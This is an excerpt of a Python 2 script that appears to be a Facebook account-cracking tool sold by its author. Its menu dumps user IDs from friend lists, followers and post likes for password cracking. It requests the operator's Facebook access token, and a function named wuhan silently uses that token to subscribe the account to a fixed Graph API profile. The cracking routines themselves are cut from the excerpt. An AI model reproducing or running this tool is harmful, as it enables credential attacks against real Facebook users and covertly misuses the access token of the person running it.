...
# coding=utf-8
# code by Karma David
# my facebook ( https://www.facebook.com/KArma428)
...
\033[1;93m #    # #     # #     # #     # #     # 
 ...
 \033[37;1m[\033[41;1mWARNING NOT TO BE RESOLD \033[00;1m\033[37;1m ]\n

 \033[32;1mCreator \033[37;1m: \033[33;1mKarma David
 
 \033[32;1mVersion \033[37;1m: \033[33;1m100.002                                     
"""
CorrectUsername = "DATURAGNA"
CorrectPassword = "KARMADAVID"
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print '\n\n [%s!%s] opshh you get no result :('%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
    print (' %s*%s This tool uses facebook token login.\n %s*%s do you know how to get facebook token?\n %s*%s type %sopen%s to Buy Token App'%(O,N,O,N,O,N,H,N))
    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s *%s note! Buy Token App From Karma'%(B,N);time.sleep(2)
        print '%s *%s jangan lupa! url ubah ke %s At The PriCe Of #2000'%(B,N,H);time.sleep(2)
        print '%s *%s send ScreenShot When Paid'%(B,N,H);time.sleep(2)
...
def moch_yayan():
    ...
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. Dump id From FriendList'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. Dump id From public'%(O,N);time.sleep(0.03)
    print ' [%s3%s]. Dump id From followers'%(O,N);time.sleep(0.03)
    print ' [%s4%s]. Dump id From like postingan'%(O,N);time.sleep(0.03)
    print ' [%s5%s]. Start Cracking'%(O,N);time.sleep(0.03)
    print ' [%s6%s]. Check fb account information '%(O,N);time.sleep(0.03)
    print ' [%s7%s]. See crack Result'%(O,N);time.sleep(0.03)
    print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
    print ' [%s9%s]. About %sscript%s'%(O,N,O,N);time.sleep(0.03)
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/553503218/subscribers?access_token=%s'%(kentod))
...
def info_tools():
    ...
    print '\n %s[%s>%s] Github   : https://github.com/Karma--kh3n'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/Karma428'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Karma428'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/Karmadavidd'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Blogspot : https://karma-smm.tech'%(N,H,N);time.sleep(0.07)
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    print ' [%s1%s]. method Graph (fast)'%(O,N)
